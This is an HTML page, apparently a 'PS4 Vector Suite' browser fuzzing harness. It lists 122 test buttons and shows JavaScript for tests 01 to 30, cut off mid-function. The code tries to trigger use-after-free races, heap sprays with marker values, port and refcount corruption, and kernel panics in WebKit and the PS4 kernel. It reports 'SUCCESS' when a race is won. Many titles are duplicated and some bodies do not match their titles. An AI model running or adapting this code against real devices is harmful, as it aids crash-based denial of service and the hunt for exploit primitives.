<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Vector Suite</title>
</head>
<body>

<h1>SUITE V46000: THREAD & IPC VECTORS</h1>

<button onclick="runTest01()">01. Thread Lifecycle: Worker Terminate Race (UAF)</button>
<button onclick="runTest02()">02. IPC Churn: Recursive MessagePort Transfer (Kernel Stack)</button>
<button onclick="runTest03()">03. Heap Pressure: Huge TypedArray Neutering (Alloc Fail)</button>
<button onclick="runTest04()">04. Kernel Panic: Cross-Context Port Entanglement (Refcount)</button>
<button onclick="runTest05()">05. Kernel Panic: Scheduler Queue Flood (Kthread Exhaustion)</button>
<button onclick="runTest06()">06. Kernel Panic: Blob VFS Race (Filesystem Locking)</button>
<button onclick="runTest07()">07. Thread Lifecycle: Recursive Worker Tree Collapse (Scheduler Race)</button>
<button onclick="runTest08()">08. IPC Churn: Circular Port Entanglement & Random Close (UAF)</button>
<button onclick="runTest09()">09. Heap Pressure: ArrayBuffer Spray via History State (OOM Panic)</button>
<button onclick="runTest10()">10. Kernel Panic: BroadcastChannel Thundering Herd (Wakeup Storm)</button>
<button onclick="runTest11()">11. Kernel Panic: File Descriptor Revoke vs Read (Struct File UAF)</button>
<button onclick="runTest12()">12. Cross-Context: Detached Iframe Port Traffic (Dangling Ref)</button>
<button onclick="runTest13()">13. WebKit: Worker Lifecycle Termination UAF</button>
<button onclick="runTest14()">14. WebKit: Recursive MessagePort Transfer Chain</button>
<button onclick="runTest15()">15. WebKit: Huge ArrayBuffer Heap Spray & GC</button>
<button onclick="runTest16()">16. WebKit: Cross-Context Detached Iframe Race</button>
<button onclick="runTest17()">17. WebKit: Blob URL Lifetime Mismatch</button>
<button onclick="runTest18()">18. Kernel: Circular IPC Port Entanglement Panic</button>
<button onclick="runTest19()">19. Kernel: BroadcastChannel Global List Corruption</button>
<button onclick="runTest20()">20. Kernel: Scheduler Contention Worker Flood</button>
<button onclick="runTest21()">21. Kernel: Nested Worker Cleanup Race</button>
<button onclick="runTest22()">22. Kernel: File Descriptor / Pipe Exhaustion</button>
<button onclick="runTest23()">23. WebKit: Worker GC Interfering with Termination (UAF)</button>
<button onclick="runTest24()">24. WebKit: Port Chain Buffer Neuter Race</button>
<button onclick="runTest25()">25. WebKit: History State Allocator Pressure (Slab Reuse)</button>
<button onclick="runTest26()">26. WebKit: Detached Iframe Port Access via Worker</button>
<button onclick="runTest27()">27. WebKit: Nested Worker Rapid Fire Termination</button>
<button onclick="runTest28()">28. Kernel: Circular Port Transfer & Thread Kill (Refcount)</button>
<button onclick="runTest29()">29. Kernel: BroadcastChannel Thundering Herd Termination</button>
<button onclick="runTest30()">30. Kernel: IPC Queue Overflow & Port Destruction</button>
<button onclick="runTest31()">31. Kernel: Blob Fetch vs Revoke vs Thread Kill</button>
<button onclick="runTest32()">32. Kernel: Global Storage Event List Corruption</button>
<button onclick="runTest33()">33. WebKit: Worker Termination GC Race (UAF)</button>
<button onclick="runTest34()">34. WebKit: MessagePort Transfer Ping-Pong Churn</button>
<button onclick="runTest35()">35. WebKit: ArrayBuffer Slab Re-use Pressure</button>
<button onclick="runTest36()">36. WebKit: Cross-Context Detached Port Lifetime</button>
<button onclick="runTest37()">37. WebKit: Blob URL Revoke vs Fetch Thread Race</button>
<button onclick="runTest38()">38. Kernel: Circular IPC Port Ring Refcount Panic</button>
<button onclick="runTest39()">39. Kernel: BroadcastChannel Storm & Thread Kill</button>
<button onclick="runTest40()">40. Kernel: Nested Worker Scheduler Contention</button>
<button onclick="runTest41()">41. Kernel: IPC Buffer Exhaustion & Close Race</button>
<button onclick="runTest42()">42. Kernel: Global Storage Event List Corruption</button>
<button onclick="runTest43()">43. WebKit: Worker GC Graph Traversal Race (UAF)</button>
<button onclick="runTest44()">44. WebKit: Recursive MessageChannel Neutering</button>
<button onclick="runTest45()">45. WebKit: Cross-Context Blob URI Revoke Race</button>
<button onclick="runTest46()">46. WebKit: Map/Set Iterator Invalidated Heap Spray</button>
<button onclick="runTest47()">47. WebKit: Port Entanglement & Iframe Destruction</button>
<button onclick="runTest48()">48. Kernel: BroadcastChannel Scheduler Contention</button>
<button onclick="runTest49()">49. Kernel: Circular IPC Refcount Underflow Panic</button>
<button onclick="runTest50()">50. Kernel: Global Storage Event Listener List Race</button>
<button onclick="runTest51()">51. Kernel: Nested Proc Structure Cleanup Race</button>
<button onclick="runTest52()">52. Kernel: File Descriptor Table Exhaustion & Revoke</button>
<button onclick="runTest53()">53. WebKit: Recursive Worker Chain Buffer Race</button>
<button onclick="runTest54()">54. WebKit: Deep Nested MessagePort Transfer</button>
<button onclick="runTest55()">55. WebKit: Array.from Iterator Buffer Neuter</button>
<button onclick="runTest56()">56. WebKit: Iframe Navigation Port Detachment</button>
<button onclick="runTest57()">57. WebKit: Blob URL Revoke Worker Timing Attack</button>
<button onclick="runTest58()">58. Kernel: Ring IPC Refcount Chaos Panic</button>
<button onclick="runTest59()">59. Kernel: Scheduler Spinlock Thread Termination</button>
<button onclick="runTest60()">60. Kernel: BroadcastChannel Name Collision Storm</button>
<button onclick="runTest61()">61. Kernel: Recursive Process Depth Exhaustion</button>
<button onclick="runTest62()">62. Kernel: Message Queue Pipe Fill & Close Race</button>
<button onclick="runTest63()">63. WebKit: Worker Circular Reference GC Panic</button>
<button onclick="runTest64()">64. WebKit: Nested MessagePort Transfer Chain Collapse</button>
<button onclick="runTest65()">65. WebKit: History State Slab Allocator Flood</button>
<button onclick="runTest66()">66. WebKit: Detached Iframe Port Zombie Access</button>
<button onclick="runTest67()">67. WebKit: Blob VFS Handle Revocation Race</button>
<button onclick="runTest68()">68. Kernel: Recursive IPC Refcount Overflow Panic</button>
<button onclick="runTest69()">69. Kernel: BroadcastChannel Thundering Herd Kill</button>
<button onclick="runTest70()">70. Kernel: Pipe Buffer Exhaustion & Close Race</button>
<button onclick="runTest71()">71. Kernel: Global Storage Listener List Corruption</button>
<button onclick="runTest72()">72. Kernel: VFS File Descriptor Table Thrashing</button>
<button onclick="runTest73()">73. WebKit: Recursive Worker Termination & Buffer Transfer Race</button>
<button onclick="runTest74()">74. WebKit: Deep MessagePort Chain Neuter & Close</button>
<button onclick="runTest75()">75. WebKit: History State Swiss Cheese Heap Spray</button>
<button onclick="runTest76()">76. WebKit: Iframe to Worker Port Transfer & Detach</button>
<button onclick="runTest77()">77. WebKit: Blob URL Fetch Flood & Revocation Timing</button>
<button onclick="runTest78()">78. Kernel: Ring Topology IPC Refcount Panic</button>
<button onclick="runTest79()">79. Kernel: Nested Worker Fork Bomb & Scheduler Kill</button>
<button onclick="runTest80()">80. Kernel: Full IPC Queue Transfer to Dying Thread</button>
<button onclick="runTest81()">81. Kernel: Storage Event Listener List Thrashing</button>
<button onclick="runTest82()">82. Kernel: VFS File Descriptor Exhaustion & Slice Race</button>
<button onclick="runTest83()">83. WebKit: Recursive Worker Buffer Ping-Pong Race</button>
<button onclick="runTest84()">84. WebKit: MessagePort Entanglement & Random Destruction</button>
<button onclick="runTest85()">85. WebKit: History State & ArrayBuffer Heap Fragmentation</button>
<button onclick="runTest86()">86. WebKit: Detached Iframe Port Transfer & GC</button>
<button onclick="runTest87()">87. WebKit: Blob URL Fetch vs Revoke vs Terminate</button>
<button onclick="runTest88()">88. Kernel: Circular IPC Refcount Cycle Panic</button>
<button onclick="runTest89()">89. Kernel: BroadcastChannel Thundering Herd Termination</button>
<button onclick="runTest90()">90. Kernel: IPC Pipe Buffer Overflow & Worker Kill</button>
<button onclick="runTest91()">91. Kernel: Global Storage Event Listener List Corruption</button>
<button onclick="runTest92()">92. Kernel: VFS File Descriptor Exhaustion & Slice Race</button>
<button onclick="runTest93()">93. WebKit: Recursive Worker Buffer UAF & GC Pressure</button>
<button onclick="runTest94()">94. WebKit: MessagePort Entanglement Storm & Random Pruning</button>
<button onclick="runTest95()">95. WebKit: History API Slab Allocator Heap Spray</button>
<button onclick="runTest96()">96. WebKit: Zombie Iframe Port Transfer to Dying Worker</button>
<button onclick="runTest97()">97. WebKit: Blob VFS Lookup vs Revocation vs Thread Kill</button>
<button onclick="runTest98()">98. Kernel: Circular IPC Ring Refcount Underflow</button>
<button onclick="runTest99()">99. Kernel: BroadcastChannel Wakeup Storm & Mass Termination</button>
<button onclick="runTest100()">100. Kernel: Full Pipe Transfer to Zombie Process</button>
<button onclick="runTest101()">101. Kernel: Global Storage Listener List Race Condition</button>
<button onclick="runTest102()">102. Kernel: File Descriptor Table Lock Contention</button>
<button onclick="runTest103()">103. WebKit: Recursive Worker Transfer UAF Race</button>
<button onclick="runTest104()">104. WebKit: MessagePort Chain Random Pruning</button>
<button onclick="runTest105()">105. WebKit: History State Slab Allocator Stress</button>
<button onclick="runTest106()">106. WebKit: Detached Iframe Port Zombie Transfer</button>
<button onclick="runTest107()">107. WebKit: Blob URL Fetch vs Revoke vs Kill</button>
<button onclick="runTest108()">108. Kernel: Ring IPC Refcount Underflow Panic</button>
<button onclick="runTest109()">109. Kernel: BroadcastChannel Thundering Herd Kill</button>
<button onclick="runTest110()">110. Kernel: Dead Process Pipe Buffer Transfer</button>
<button onclick="runTest111()">111. Kernel: Global Storage Listener List Corruption</button>
<button onclick="runTest112()">112. Kernel: File Descriptor Table Lock Contention</button>
<button onclick="runTest113()">113. WebKit: Recursive Worker Buffer UAF & GC Pressure</button>
<button onclick="runTest114()">114. WebKit: MessagePort Entanglement Storm & Random Pruning</button>
<button onclick="runTest115()">115. WebKit: History API Slab Allocator Heap Spray</button>
<button onclick="runTest116()">116. WebKit: Zombie Iframe Port Transfer to Dying Worker</button>
<button onclick="runTest117()">117. WebKit: Blob VFS Lookup vs Revocation vs Thread Kill</button>
<button onclick="runTest118()">118. Kernel: Circular IPC Ring Refcount Underflow</button>
<button onclick="runTest119()">119. Kernel: BroadcastChannel Thundering Herd Kill</button>
<button onclick="runTest120()">120. Kernel: Full Pipe Transfer to Zombie Process</button>
<button onclick="runTest121()">121. Kernel: Global Storage Listener List Race Condition</button>
<button onclick="runTest122()">122. Kernel: File Descriptor Table Lock Contention</button>

<div id="log">System Ready...</div>


<script>
    const L = document.getElementById('log');
    function log(m) { L.innerText += "\n[" + new Date().toLocaleTimeString() + "] " + m; L.scrollTop = L.scrollHeight; }

    function runTest01() {
        log("Init Test 01: Worker Lifecycle...");
        const blob = new Blob(["self.onmessage=e=>{let buf=new ArrayBuffer(1024*1024);try{self.postMessage(buf,[buf])}catch(e){}}"], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        const ref = [];
        try {
            for(let i=0; i<100; i++) {
                const w = new Worker(url);
                const ab = new ArrayBuffer(1024*512);
                w.postMessage(ab, [ab]); 
                w.terminate(); 
                if(ab.byteLength !== 0) { log("SUCCESS: Buffer not neutered (Race won): " + ab.byteLength); return; }
                ref.push(w); 
                if(i%20===0) { const junk = new Uint32Array(1024*10); } 
            }
            log("Test 01 Finished. Workers terminated.");
        } catch(e) { log("FAIL: " + e.message); }
    }

    function runTest02() {
        log("Init Test 02: IPC Recursive Transfer...");
        const ch = new MessageChannel();
        let port = ch.port1;
        try {
            for(let i=0; i<2000; i++) {
                const next = new MessageChannel();
                port.postMessage("layer", [next.port1]);
                port = next.port2;
            }
            ch.port2.onmessage = e => {
                log("SUCCESS: Received deep message (Stack survived)");
                e.ports[0].postMessage("ping");
            };
            log("Ports chained. Waiting for kernel stack...");
        } catch(e) { log("FAIL: " + e.message); }
    }

    function runTest03() {
        log("Init Test 03: Heap Pressure & Detach...");
        const arrs = [];
        try {
            for(let i=0; i<50; i++) {
                const buf = new ArrayBuffer(1024*1024*10); 
                const view = new DataView(buf);
                view.setUint32(0, 0x41414141, true);
                try { 
                    postMessage("detach", "*", [buf]); 
                    if(buf.byteLength > 0) { log("SUCCESS: Detach failed at " + i); return; }
                } catch(e) {}
                arrs.push(new Uint8Array(1024*1024)); 
            }
            log("Allocated 500MB+ virtual. Check for Panic.");
        } catch(e) { log("FAIL: " + e.message); }
    }

    function runTest04() {
        log("Init Test 04: Cross-Context Entanglement...");
        const wUrl = URL.createObjectURL(new Blob(["onmessage=e=>{e.ports[0].postMessage('bounce',[e.ports[1]])}"], {type:'text/javascript'}));
        const workers = [];
        try {
            for(let i=0; i<20; i++) {
                const w = new Worker(wUrl);
                const ch = new MessageChannel();
                const subCh = new MessageChannel();
                w.postMessage("init", [ch.port2, subCh.port2]);
                ch.port1.onmessage = e => {
                    w.terminate(); 
                    e.ports[0].close(); 
                };
                workers.push(w);
            }
            log("Workers entangled and terminated. Waiting for refcount panic.");
        } catch(e) { log("FAIL: " + e.message); }
    }

    function runTest05() {
        log("Init Test 05: Scheduler Flood...");
        const blob = new Blob(["setInterval(()=>{for(let i=0;i<1000;i++)Math.sin(i)},1)"], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        const ws = [];
        try {
            for(let i=0; i<60; i++) {
                ws.push(new Worker(url));
            }
            setTimeout(() => {
                log("Terminating swarm...");
                ws.forEach(w => w.terminate());
                log("Cleanup triggered. Watch for deadlock.");
            }, 2000);
        } catch(e) { log("FAIL: " + e.message); }
    }

    function runTest06() {
        log("Init Test 06: Blob VFS Race...");
        const wCode = "onmessage=e=>{fetch(e.data).then(r=>r.text()).catch(()=>{})}";
        const wUrl = URL.createObjectURL(new Blob([wCode], {type:'text/javascript'}));
        const w = new Worker(wUrl);
        const chunk = new Uint8Array(1024).fill(0xCC);
        try {
            let hits = 0;
            const i = setInterval(() => {
                if(hits++ > 500) clearInterval(i);
                const b = new Blob([chunk]);
                const u = URL.createObjectURL(b);
                w.postMessage(u);
                setTimeout(() => URL.revokeObjectURL(u), 0); 
            }, 5);
            log("VFS Race started...");
        } catch(e) { log("FAIL: " + e.message); }
    }
function runTest07() {
        log("Init Test 07: Recursive Worker Tree Collapse...");
        const code = `self.onmessage = e => {
            if(e.data.depth > 0) {
                const w = new Worker(URL.createObjectURL(new Blob([document.getElementById('wScript').textContent], {type:'text/javascript'})));
                w.postMessage({depth: e.data.depth - 1});
                self.postMessage('created');
                const buf = new Uint8Array(1024*1024);
                setInterval(() => { try { self.postMessage(buf, [buf.buffer]) } catch(e){} }, 10);
            }
        }`;
        const blob = new Blob([code.replace("document.getElementById('wScript').textContent", `\`${code}\``)], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        const roots = [];
        try {
            for(let i=0; i<10; i++) {
                const w = new Worker(url);
                w.postMessage({depth: 5}); 
                roots.push(w);
            }
            setTimeout(() => {
                log("Collapsing thread tree...");
                roots.forEach(w => w.terminate()); 
                const pressure = new Array(5000).fill(1).map(() => new MessageChannel());
                log("Tree collapsed. Checking for scheduler panic.");
            }, 1000);
        } catch(e) { log("FAIL: " + e.message); }
    }

    function runTest08() {
        log("Init Test 08: Circular Port Entanglement...");
        const channels = [];
        const Count = 200;
        try {
            for(let i=0; i<Count; i++) channels.push(new MessageChannel());
            for(let i=0; i<Count; i++) {
                const next = (i + 1) % Count;
                channels[i].port1.postMessage("entangle", [channels[next].port1]);
            }
            let active = 0;
            const i = setInterval(() => {
                const idx = Math.floor(Math.random() * Count);
                try {
                    channels[idx].port2.postMessage("ping");
                    channels[idx].port2.close();
                } catch(e) {}
                if(active++ > 1000) {
                    clearInterval(i);
                    log("SUCCESS: Entanglement stress complete.");
                }
            }, 1);
        } catch(e) { log("FAIL: " + e.message); }
    }

    function runTest09() {
        log("Init Test 09: History State Heap Spray...");
        const huge = new Uint32Array(1024 * 512); 
        for(let i=0; i<huge.length; i++) huge[i] = 0x41414141;
        try {
            let i = 0;
            const interval = setInterval(() => {
                try {
                    history.pushState(huge, "s"+i, "?s="+i);
                    const iframe = document.createElement('iframe');
                    document.body.appendChild(iframe);
                    iframe.contentWindow.history.pushState(huge, "if"+i, "?if="+i);
                    document.body.removeChild(iframe); 
                } catch(e) {
                    log("Memory limit hit at " + i + ". Triggering GC.");
                    clearInterval(interval);
                    const gc = [];
                    for(let k=0; k<10000; k++) gc.push({x:1});
                }
                if(i++ > 500) clearInterval(interval);
            }, 5);
        } catch(e) { log("FAIL: " + e.message); }
    }

    function runTest10() {
        log("Init Test 10: BroadcastChannel Thundering Herd...");
        const bcName = "panic_channel_" + Date.now();
        const code = `const bc = new BroadcastChannel('${bcName}'); bc.onmessage = () => { let x = 0; for(let i=0; i<10000; i++) x+=i; postMessage(x); }`;
        const blob = new Blob([code], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        const workers = [];
        try {
            for(let i=0; i<64; i++) workers.push(new Worker(url));
            const mainBc = new BroadcastChannel(bcName);
            let count = 0;
            const iv = setInterval(() => {
                mainBc.postMessage("wake");
                if(count++ > 20) {
                    clearInterval(iv);
                    log("Terminating herd...");
                    workers.forEach(w => w.terminate());
                    mainBc.postMessage("afterlife");
                    log("Herd terminated during lock contention.");
                }
            }, 50);
        } catch(e) { log("FAIL: " + e.message); }
    }

    function runTest11() {
        log("Init Test 11: File Descriptor Revoke Race...");
        const code = `self.onmessage = async e => { 
            try { 
                const r = await fetch(e.data); 
                const t = await r.text(); 
                self.postMessage(t.length); 
            } catch(x) { self.postMessage('err'); } 
        }`;
        const blob = new Blob([code], {type:'text/javascript'});
        const wUrl = URL.createObjectURL(blob);
        const w = new Worker(wUrl);
        const targetBlob = new Blob([new Uint8Array(1024*1024*10).fill(65)]);
        try {
            const url = URL.createObjectURL(targetBlob);
            w.postMessage(url);
            let race = 0;
            const i = setInterval(() => {
                if(race++ > 10) {
                    URL.revokeObjectURL(url);
                    w.terminate();
                    clearInterval(i);
                    const fr = new FileReader();
                    fr.readAsArrayBuffer(targetBlob);
                    log("Revoke/Terminate race condition executed.");
                }
            }, 1);
        } catch(e) { log("FAIL: " + e.message); }
    }

    function runTest12() {
        log("Init Test 12: Cross-Context Detached Port...");
        const ifr = document.createElement('iframe');
        document.body.appendChild(ifr);
        const ch = new MessageChannel();
        try {
            ifr.contentWindow.postMessage("init", "*", [ch.port2]);
            const port = ch.port1;
            document.body.removeChild(ifr);
            let k = 0;
            const i = setInterval(() => {
                port.postMessage({payload: new Array(1000).fill(k)});
                if(k++ > 500) {
                    clearInterval(i);
                    port.close();
                    log("SUCCESS: Messages sent to detached context.");
                }
            }, 2);
        } catch(e) { log("FAIL: " + e.message); }
    }
 function runTest13() {
        log("Init Test 13: Worker Lifecycle UAF...");
        const code = `self.onmessage = e => { 
            const arr = new Uint32Array(1024*1024);
            for(let i=0; i<arr.length; i+=4096) arr[i] = 0x41414141;
            self.postMessage(arr, [arr.buffer]);
        }`;
        const blob = new Blob([code], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        const ref = [];
        try {
            for(let i=0; i<50; i++) {
                const w = new Worker(url);
                w.onmessage = e => {
                    if(e.data.byteLength > 0) log("FAIL: Buffer survived transfer");
                };
                w.postMessage("init");
                w.terminate(); 
                ref.push(w); 
                const pressure = new Array(1000).fill(i); 
            }
            log("SUCCESS: 50 Workers terminated in race window.");
        } catch(e) { log("FAIL: " + e.message); }
    }

    function runTest14() {
        log("Init Test 14: Recursive IPC Chain...");
        const ch = new MessageChannel();
        let port = ch.port1;
        const depth = 1000;
        try {
            for(let i=0; i<depth; i++) {
                const next = new MessageChannel();
                port.postMessage({idx: i}, [next.port1]);
                port = next.port2;
                if(i % 100 === 0) {
                    const junk = new Uint8Array(1024 * 10).fill(0xCC);
                }
            }
            ch.port2.onmessage = e => {
                let p = e.ports[0];
                let count = 0;
                const drain = () => {
                    if(count++ < depth) {
                        p.onmessage = ev => { p = ev.ports[0]; drain(); };
                        p.postMessage("ping");
                    } else {
                        log("SUCCESS: IPC Chain drained without crash.");
                    }
                };
                drain();
            };
            log("Chain created. Starting drain...");
        } catch(e) { log("FAIL: " + e.message); }
    }

    function runTest15() {
        log("Init Test 15: Heap Spray & GC Pressure...");
        const allocs = [];
        try {
            const spray = () => {
                for(let i=0; i<100; i++) {
                    const buf = new ArrayBuffer(1024 * 1024 * 2); 
                    const view = new DataView(buf);
                    view.setUint32(0, 0xDEADBEEF, true);
                    allocs.push(buf);
                }
            };
            spray();
            log("Allocated ~200MB. Triggering history state push...");
            for(let i=0; i<500; i++) {
                history.pushState(allocs[i % allocs.length], "state"+i, null);
                if(i % 50 === 0) {
                    allocs.length = 0; 
                    spray();
                }
            }
            log("SUCCESS: Heap pressure loop completed.");
        } catch(e) { log("FAIL: OOM or Error: " + e.message); }
    }

    function runTest16() {
        log("Init Test 16: Cross-Context Iframe Race...");
        const ifr = document.createElement('iframe');
        document.body.appendChild(ifr);
        const win = ifr.contentWindow;
        const ch = new MessageChannel();
        try {
            win.postMessage("init", "*", [ch.port2]);
            const port = ch.port1;
            let count = 0;
            const i = setInterval(() => {
                if(count === 50) {
                    document.body.removeChild(ifr);
                    log("Iframe detached. Continuing IPC...");
                }
                port.postMessage({data: new Uint8Array(1024).fill(count)});
                if(count++ > 200) {
                    clearInterval(i);
                    port.close();
                    log("SUCCESS: Messages sent to detached context.");
                }
            }, 5);
        } catch(e) { log("FAIL: " + e.message); }
    }

    function runTest17() {
        log("Init Test 17: Blob URL Lifetime...");
        const chunks = [];
        for(let i=0; i<100; i++) chunks.push(new Uint8Array(1024).fill(i));
        const b = new Blob(chunks);
        const url = URL.createObjectURL(b);
        const wCode = `onmessage=e=>{fetch(e.data).then(r=>r.arrayBuffer()).then(b=>postMessage(b.byteLength))}`;
        const wUrl = URL.createObjectURL(new Blob([wCode], {type:'text/javascript'}));
        const w = new Worker(wUrl);
        try {
            let hits = 0;
            const i = setInterval(() => {
                w.postMessage(url);
                if(hits++ === 20) {
                    URL.revokeObjectURL(url); 
                    log("URL revoked. Race active.");
                }
                if(hits > 100) {
                    clearInterval(i);
                    w.terminate();
                    log("SUCCESS: Fetch attempts on revoked URL complete.");
                }
            }, 10);
        } catch(e) { log("FAIL: " + e.message); }
    }

    function runTest18() {
        log("Init Test 18: Kernel Circular Port Entanglement...");
        const chA = new MessageChannel();
        const chB = new MessageChannel();
        const chC = new MessageChannel();
        try {
            chA.port1.postMessage("link", [chB.port1]);
            chB.port2.postMessage("link", [chC.port1]);
            chC.port2.postMessage("link", [chA.port2]); 
            
            const rapidClose = [chA.port1, chB.port2, chC.port2];
            let k = 0;
            const i = setInterval(() => {
                try {
                    if(k < rapidClose.length) rapidClose[k].postMessage("stress");
                } catch(e){}
                k++;
                if(k > 50) {
                    clearInterval(i);
                    chA.port1.close(); chB.port2.close(); chC.port2.close();
                    log("SUCCESS: Circular ports stressed and closed.");
                }
            }, 2);
        } catch(e) { log("FAIL: " + e.message); }
    }

    function runTest19() {
        log("Init Test 19: Global BroadcastChannel List...");
        const name = "kernel_list_" + Date.now();
        const chans = [];
        try {
            for(let i=0; i<500; i++) {
                chans.push(new BroadcastChannel(name));
            }
            log("Created 500 channels. Triggering storm...");
            chans[0].postMessage("trigger");
            
            setTimeout(() => {
                for(let i=0; i<500; i+=2) {
                    chans[i].close(); 
                }
                chans[0].postMessage("after_close");
                log("SUCCESS: Mixed close/message operations.");
            }, 100);
        } catch(e) { log("FAIL: " + e.message); }
    }

    function runTest20() {
        log("Init Test 20: Scheduler Contention Flood...");
        const blob = new Blob(["while(true){Math.random();}"], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        const workers = [];
        try {
            for(let i=0; i<8; i++) { 
                workers.push(new Worker(url));
            }
            log("8 CPU-bound workers started. Main thread locking...");
            const t0 = performance.now();
            while(performance.now() - t0 < 2000) {
                const x = Math.sin(Math.random());
            }
            workers.forEach(w => w.terminate());
            log("SUCCESS: Main thread released. Workers terminated.");
        } catch(e) { log("FAIL: " + e.message); }
    }

    function runTest21() {
        log("Init Test 21: Nested Worker Cleanup...");
        const childCode = "setInterval(()=>postMessage('c'), 10)";
        const parentCode = `
            const blob = new Blob(["${childCode}"], {type:'text/javascript'});
            const url = URL.createObjectURL(blob);
            const w = new Worker(url);
            w.onmessage = e => postMessage(e.data);
            setTimeout(() => w.terminate(), 500);
        `;
        const pUrl = URL.createObjectURL(new Blob([parentCode], {type:'text/javascript'}));
        const parents = [];
        try {
            for(let i=0; i<20; i++) {
                parents.push(new Worker(pUrl));
            }
            setTimeout(() => {
                parents.forEach(p => p.terminate()); 
                log("SUCCESS: Parent workers terminated (Orphaning children).");
            }, 200);
        } catch(e) { log("FAIL: " + e.message); }
    }

    function runTest22() {
        log("Init Test 22: File Descriptor / Pipe Exhaustion...");
        const bigBlob = new Blob([new Uint8Array(1024*1024*5).fill(0xAA)]);
        const readers = [];
        try {
            for(let i=0; i<2000; i++) {
                const fr = new FileReader();
                fr.readAsArrayBuffer(bigBlob.slice(0, 1024));
                readers.push(fr);
            }
            log("SUCCESS: 2000 FileReaders dispatched concurrently.");
        } catch(e) { log("FAIL: " + e.message); }
    }
 function runTest23() {
        log("Init Test 23: Worker GC Race...");
        const code = `
            self.onmessage = e => {
                let hold = [];
                for(let i=0; i<10000; i++) hold.push({a:i, b:new Uint8Array(1024)});
                self.postMessage("allocated");
                const buf = new ArrayBuffer(1024*1024);
                try { self.postMessage(buf, [buf]); } catch(e){}
            };
        `;
        const url = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
        try {
            for(let i=0; i<20; i++) {
                const w = new Worker(url);
                w.onmessage = e => {
                    if(e.data === "allocated") w.terminate();
                };
                w.postMessage("start");
                const trash = new Array(20000).fill(1).map(x => ({x})); 
            }
            log("SUCCESS: Workers cycled with GC pressure.");
        } catch(e) { log("FAIL: " + e.message); }
    }

    function runTest24() {
        log("Init Test 24: Port Chain Neuter Race...");
        const ch1 = new MessageChannel();
        const ch2 = new MessageChannel();
        const buf = new ArrayBuffer(1024 * 1024 * 5); 
        const view = new Uint8Array(buf);
        view[0] = 0xFF;
        try {
            ch1.port1.onmessage = e => {
                const b = e.data;
                ch2.port1.postMessage(b, [b]);
                if(b.byteLength > 0) log("FAIL: Buffer readable after transfer!");
            };
            ch2.port2.onmessage = e => {
                const b = e.data;
                if(b.byteLength === 0) log("SUCCESS: Buffer correctly neutered through chain.");
            };
            ch1.port2.postMessage(buf, [buf]);
            try { if(buf.byteLength > 0) log("FAIL: Source buffer not neutered"); } catch(e){}
        } catch(e) { log("FAIL: " + e.message); }
    }

    function runTest25() {
        log("Init Test 25: History Allocator Pressure...");
        const states = [];
        const huge = new Uint32Array(1024 * 256); 
        huge.fill(0x11223344);
        try {
            let k = 0;
            const i = setInterval(() => {
                try {
                    const s = { data: huge, id: k };
                    history.pushState(s, "s"+k, null);
                    states.push(history.state);
                    if(states.length > 50) states.shift(); 
                } catch(e) {
                    clearInterval(i);
                    log("Alloc failed/Limit hit at " + k);
                }
                if(k++ > 200) {
                    clearInterval(i);
                    log("SUCCESS: History stack stressed.");
                }
            }, 5);
        } catch(e) { log("FAIL: " + e.message); }
    }

    function runTest26() {
        log("Init Test 26: Detached Iframe Worker Race...");
        const ifr = document.createElement('iframe');
        document.body.appendChild(ifr);
        const wCode = `self.onmessage = e => { e.data.postMessage("ping"); }`;
        const wUrl = URL.createObjectURL(new Blob([wCode], {type:'text/javascript'}));
        const w = new Worker(wUrl);
        const ch = new MessageChannel();
        try {
            w.postMessage(ch.port2, [ch.port2]);
            ch.port1.onmessage = e => {
                log("Message received from worker via port.");
            };
            setTimeout(() => {
                document.body.removeChild(ifr); 
                w.terminate(); 
                ch.port1.postMessage("dead?"); 
                log("SUCCESS: Contexts detached during IPC.");
            }, 100);
        } catch(e) { log("FAIL: " + e.message); }
    }

    function runTest27() {
        log("Init Test 27: Nested Worker Rapid Fire...");
        const subCode = `self.postMessage("ready");`;
        const subBlob = new Blob([subCode], {type:'text/javascript'});
        const subUrl = URL.createObjectURL(subBlob);
        const mainCode = `
            const u = '${subUrl}';
            self.onmessage = e => {
                for(let i=0; i<10; i++) {
                    const w = new Worker(u);
                    w.terminate();
                }
                self.postMessage("done");
            };
        `;
        const mainUrl = URL.createObjectURL(new Blob([mainCode], {type:'text/javascript'}));
        try {
            for(let i=0; i<5; i++) {
                const w = new Worker(mainUrl);
                w.postMessage("go");
            }
            log("SUCCESS: Nested creation/termination batch dispatched.");
        } catch(e) { log("FAIL: " + e.message); }
    }

    function runTest28() {
        log("Init Test 28: Kernel Circular Refcount...");
        const wCode = `
            self.onmessage = e => {
                const p1 = e.data.p1;
                const p2 = e.data.p2;
                p1.postMessage("link", [p2]);
                self.close(); 
            };
        `;
        const url = URL.createObjectURL(new Blob([wCode], {type:'text/javascript'}));
        try {
            for(let i=0; i<50; i++) {
                const w = new Worker(url);
                const ch = new MessageChannel();
                // Send port2 via port1, then kill worker holding them
                w.postMessage({p1: ch.port1, p2: ch.port2}, [ch.port1, ch.port2]);
            }
            log("SUCCESS: Circular references sent to dying threads.");
        } catch(e) { log("FAIL: " + e.message); }
    }

    function runTest29() {
        log("Init Test 29: BroadcastChannel Thundering Herd...");
        const name = "herd_" + Date.now();
        const code = `
            const bc = new BroadcastChannel('${name}');
            bc.onmessage = e => { 
                const arr = new Uint8Array(1024*1024); 
                bc.postMessage(arr); 
                self.close(); 
            };
        `;
        const url = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
        const workers = [];
        try {
            for(let i=0; i<40; i++) workers.push(new Worker(url));
            const bc = new BroadcastChannel(name);
            setTimeout(() => {
                log("Triggering herd...");
                bc.postMessage("go"); 
                setTimeout(() => {
                    bc.close();
                    log("SUCCESS: Herd triggered and channel closed.");
                }, 500);
            }, 1000);
        } catch(e) { log("FAIL: " + e.message); }
    }

    function runTest30() {
        log("Init Test 30: IPC Queue Overflow...");
        const ch = new MessageChannel();
        const payload = new Uint8Array(1024 * 64).fill(0xAB); 
        try {
            let sent = 0;
            const i = setInterval(() => {
                for(let k=0; k<50; k++) {
                    ch.port1.postMessage(payload);
                    sent++;
                }
                if(sent > 5000) {
                    clearInterval(i);
